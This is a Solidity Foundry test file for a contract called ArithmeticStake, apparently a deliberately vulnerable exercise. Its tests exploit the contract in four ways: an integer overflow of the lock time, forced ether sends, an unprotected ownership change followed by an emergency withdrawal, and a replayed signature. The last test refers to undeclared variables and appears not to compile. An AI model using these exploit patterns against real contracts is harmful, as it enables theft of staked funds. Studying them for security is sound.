// SPDX-License-Identifier: UNLICENSED
pragma solidity ^0.7.6;
pragma abicoder v2;

import {Test, console} from "forge-std/Test.sol";
import {ArithmeticStake} from "../src/ArithmeticStake.sol";

contract ArithmeticStakeTest is Test {
    address user1;
    address user2;
    ArithmeticStake arithmeticStake;

    function setUp() public {
        user1 = vm.addr(1);
        user2 = vm.addr(2);
        arithmeticStake = new ArithmeticStake();
        vm.deal(user1, 1 ether);
    }

    function test_flow() public {

        vm.startPrank(user1);
        arithmeticStake.stake{value: 1 ether}();
       // arithmeticStake.unstake(1 ether);
        arithmeticStake.increaseLockTime(type(uint256).max - 15 days);
        arithmeticStake.unstake(1 ether);
        vm.stopPrank();
    }

        function test_flow2() public {

        vm.prank(user2);
        (bool result, ) = address(arithmeticStake).call{value: 1 wei}("");
        if (!result) { revert ("call failed"); }

        vm.startPrank(user1);
        arithmeticStake.stake{value: 1 ether}();
        vm.warp(block.timestamp + 15 days + 1);
       // arithmeticStake.unstake(1 ether);
        //arithmeticStake.increaseLockTime(type(uint256).max - 15 days);
        arithmeticStake.unstake(1 ether);
        vm.stopPrank();
    }

        function test_flow3() public {
        vm.startPrank(user1);
        arithmeticStake.stake{value: 1 ether}();
        vm.stopPrank();

        vm.startPrank(user2);
        arithmeticStake.changeOwner(user2);
        arithmeticStake.emergencyWithdraw();
        vm.stopPrank();
    }

    function test_flow4() public {
        vm.prank(user1);
        arithmeticStake.stake{value: 1 ether}();
        vm.prank(user2);
        arithmeticStake.stake{value: 1 ether}();

        vm.startPrank(owner);
        bytes32 secret = keccak256(abi.encodePacked("Important secret id"));
        bytes32 hash = keccak256(abi.encodePacked(uint256(1 ether), secret));
        (uint8 v, bytes32 r, bytes32 s) = vm.sign(signerPrivateKey, hash);
        vm.stopPrank();

        vm.prank(user1);
        arithmeticStake.unstakeWithSignature(1 ether, secret, r, s, v);

        vm.prank(user1);
        arithmeticStake.unstakeWithSignature(1 ether, secret, r, s, v);
    }
}
